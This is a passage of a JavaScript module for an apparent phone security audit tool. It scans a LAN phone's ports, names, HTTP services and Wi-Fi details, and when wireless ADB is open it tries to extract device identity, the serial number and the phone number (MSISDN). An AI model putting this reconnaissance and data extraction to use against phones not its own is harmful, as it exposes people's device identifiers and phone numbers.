    f.vendor = oui ? friendlyVendor(oui.vendor) : null;
    f.ouiVendor = oui ? oui.vendor : null;
    f.tag = oui ? oui.tag : null;
  },
  async network(job, o, f) {
    const wlan = await wlanInfo();
    const gw = await defaultGateway();
    f.network = {
      type: wlan.ssid ? 'Wi-Fi · ' + (wlan.band ? wlan.band + ' · ' : '') + wlan.ssid : 'Wi-Fi LAN',
      ssid: wlan.ssid, band: wlan.band, radioType: wlan.radioType, gateway: gw,
    };
  },
  async ports(job, o, f) {
    const open = [];
    await pool(PHONE_PORTS, 8, async (p) => {
      // phone Wi-Fi RTT can spike past 1s in power-save — keep probes honest
      if (await tcpProbe(job.ip, p, o.tcpTimeoutMs || 1200)) open.push(p);
    });
    f.openPorts = open.sort((a, b) => a - b);
    f.services = f.openPorts.map(serviceLabel);
  },
  async nbns(job, o, f) {
    f.names = f.names || {};
    const m = await nbnsSweep([job.ip], o);
    f.names.nbns = m.get(job.ip) || null;
  },
  async mdns(job, o, f) {
    f.names = f.names || {};
    const m = await mdnsSweep([job.ip], o);
    const e = m.get(job.ip);
    f.names.mdns = e ? e.instance : null;
    f.mdnsServices = e ? e.services.slice(0, 5) : [];
  },
  async http(job, o, f) {
    const out = [];
    for (const p of (f.openPorts || []).filter((x) => HTTP_PORTS.has(x))) {
      const r = await httpProbe(job.ip, p, o.httpTimeoutMs || 1500);
      if (r) out.push({ port: p, status: r.status, server: r.server || null, title: titleFromHtml(r.body) });
    }
    f.http = out;
  },
  async adb(job, o, f) {
    if (!(f.openPorts || []).includes(5555)) return;
    // Raw CNXN probe is best-effort only: some adbd builds (e.g. MIUI) accept
    // the TCP socket but never answer a foreign-process handshake, while the
    // real `adb` binary negotiates fine. Port 5555 is already confirmed open
    // by the TCP scan, so always mark ADB exposed and let the identity step
    // attempt deep extraction via the adb binary.
    const r = await adbProbe(job.ip, o.adbTimeoutMs || 2500);
    f.adb = { open: true, banner: (r && r.banner) || null, rawHandshake: !!r };
  },
  async identity(job, o, f) {
    const id = {
      vendor: f.vendor || null,
      model: null, number: null, name: null, os: null, serialNumber: null,
    };
    if (f.adb && f.adb.banner) {
      const a = parseAdbBanner(f.adb.banner);
      id.model = a.model || a.name || a.device || null;
      id.serialNumber = a.serial || null;
      id.os = 'Android';
    }
    if (f.adb && f.adb.open) {
      // REAL deep extraction over wireless ADB: getprop identity + MSISDN via
      // iphonesubinfo — only when the target accepts this host.
      try {
        f.adb.deep = await adbDeepIdentity(job.ip, o.adbDeepTimeoutMs || 9000);
      } catch (e) {
        f.adb.deep = { connected: false, reason: String((e && e.message) || e).slice(0, 120) };
      }
      const d = f.adb.deep || {};
      if (d.connected) {
        // ADB getprop is ground truth — OUI from a randomized MAC is not
        if (d.manufacturer) id.vendor = friendlyVendor(d.manufacturer);
        id.model = id.model || d.model || d.device || null;
        id.manufacturer = d.manufacturer || null;
        id.name = id.name || d.name || null;
        id.serialNumber = d.serial || id.serialNumber;
        id.number = d.number || id.number; // real MSISDN when extractable
        id.os = d.os ? 'Android ' + d.os : (id.os || 'Android');
        id.adb = 'connected · getprop identity' + (d.number ? ' + MSISDN' : '');
      } else if (d.reason) {
        id.adb = 'open but not authorized — ' + d.reason;
      }
    }
    if (!id.name && f.names && (f.names.mdns || f.names.nbns)) id.name = f.names.mdns || f.names.nbns;
    if (!id.model && f.http) for (const h of f.http) { if (h.title) { id.model = h.title; break; } }
    if (!id.os) {
      if (f.vendor === 'Apple') id.os = 'iOS';
      else if ((f.openPorts || []).includes(62078)) id.os = 'iOS';
      else if ((f.openPorts || []).includes(8009) || (f.mdnsServices || []).includes('_googlecast')) id.os = 'Android';
    }
    f.identity = id;
  },
  async report(job, o, f) {
    f.score = computeScore(f);
    f.level = levelFor(f.score, f);
    f.risks = buildRisks(f);
  },
};

function startAudit(ip, opts = {}) {
  if (!isPrivateIp(ip)) throw new Error('Target must be a private IPv4 address.');
  for (const j of jobs.values()) {
    if (j.ip === ip && j.status === 'running') return j; // one audit per phone
  }
  const job = {
    id: newJobId(),
    ip,
    status: 'running',
    progress: 0,
    stepIndex: 0,
    steps: AUDIT_STEPS.map(([id, label]) => ({ id, label, status: 'pending', ms: null })),
    findings: {},
    score: 0,
    level: null,
    risks: [],
    log: [],
    cancelled: false,
    error: null,
    startedAt: Date.now(),
    finishedAt: null,
  };
  jobs.set(job.id, job);
  if (jobs.size > MAX_JOBS) {
    for (const [k, j] of jobs) {
      if (j.status !== 'running') { jobs.delete(k); break; }
    }
  }
  runJob(job, opts).catch((e) => {
    job.status = 'error';
    job.error = String((e && e.message) || e);
    job.finishedAt = Date.now();
  });
  return job;
}

async function runJob(job, opts) {
  const f = job.findings;
  for (let i = 0; i < job.steps.length; i++) {
    const st = job.steps[i];
    if (job.cancelled) { st.status = 'skipped'; continue; }
    st.status = 'running';
    st.startedAt = Date.now();
    job.stepIndex = i;
    job.log.push('[' + st.label + '] start');
    try {
      await AUDIT_IMPL[st.id](job, opts, f);
      st.status = 'done';
    } catch (e) {
      st.status = 'error';
      st.error = String((e && e.message) || e);
    }
    st.ms = Date.now() - st.startedAt;
    job.progress = Math.round(((i + 1) / job.steps.length) * 100);
    job.log.push('[' + st.label + '] ' + st.status + ' (' + st.ms + ' ms)');
  }
  if (job.cancelled) {
    job.status = 'cancelled';
  } else {
    job.score = f.score != null ? f.score : computeScore(f);
    job.level = f.level || levelFor(job.score, f);
    job.risks = f.risks || buildRisks(f);
    job.progress = 100;
    job.status = 'done';
  }
  job.finishedAt = Date.now();
}

function publicJob(job) {
  const f = job.findings || {};
  return {
    id: job.id,
    ip: job.ip,
    status: job.status,
    progress: job.progress,
    score: job.score,
    level: job.level,
    risks: job.risks,
    steps: job.steps.map(({ id, label, status, ms, error }) => ({ id, label, status, ms, error })),
    log: job.log.slice(-30),
    findings: {
      reachable: !!f.reachable,
      rttMs: f.rttMs != null ? f.rttMs : null,
      mac: f.mac || null,
      vendor: f.vendor || null,
      tag: f.tag || null,
      openPorts: f.openPorts || [],
      services: f.services || [],
      network: f.network || null,
      names: f.names || {},
      http: f.http || [],
      adb: f.adb || null,
      identity: f.identity || null,
      mdnsServices: f.mdnsServices || [],
    },
    startedAt: job.startedAt,
    finishedAt: job.finishedAt,
    error: job.error,
  };
}

module.exports = {
  discoverPhones,
  startAudit,
  getAudit,
  cancelAudit,
  publicJob,
  jobs,
  AUDIT_STEPS,
  PHONE_PORTS,
  QUICK_PORTS,
  // pure helpers (tests)
  lookupOui,
  friendlyVendor,
  isPrivateIp,
  parseArpText,
  parseRouteGateway,
  parseNetshWlan,
  parseAdbBanner,
  titleFromHtml,
  parseNbns,
  parseMdns,
  parsePingRtt,
  parseSsdpReply,
  parseAdbServicesOutput,
  buildDnsQuery,
  computeScore,
};